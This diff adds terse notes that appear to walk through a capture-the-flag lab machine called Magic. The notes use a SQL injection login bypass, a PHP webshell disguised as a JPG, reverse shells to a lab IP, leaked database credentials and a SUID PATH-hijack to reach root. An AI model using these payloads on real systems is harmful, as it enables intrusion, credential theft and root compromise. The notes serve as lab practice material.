@@ -1,0 +1,26 @@
+//Based on TRX and IppSec
+' or 1 -- -	//SQLi in login
+//Add the magic bytes of the JPG to our shell
+echo 'FFD8FFDB' | xxd -r -p > webshell.php.jpg
+echo '<?=`$_GET[0]`?>' >> webshell.php.jpg
+/images/uploads/webshell.php.jpg?0=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.27/9001+0>%261'
+theseus : iamkingtheseus	// /var/www/Magic/db.php5
+Database: Magic
+mysqldump -u theseus --database Magic  //select * from login
+admin:Th3s3usW4sK1ng
+
+find / -perm -4000 -exec ls -l {} \; 2>/dev/null	//enumerate SUID files, finds /bin/sysinfo (WinPeas also shows it)
+strace sysinfo	//prints all syscalls
+strace -f sysinfo
+//we find execve calls
+
+vi free                                                                                 
+#!/bin/bash                                                                                                   
+bash -c 'bash -i >& /dev/tcp/10.10.14.27:9002 0>&1'
+
+echo $PATH
+export "PATH=$(pwd):/usr/local/sbin:/usr/local/bin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games"
+chmod +x free
+nc -lvnp 9002
+free	//gives shell as the same user
+sysinfo //calls free as root and got root shell
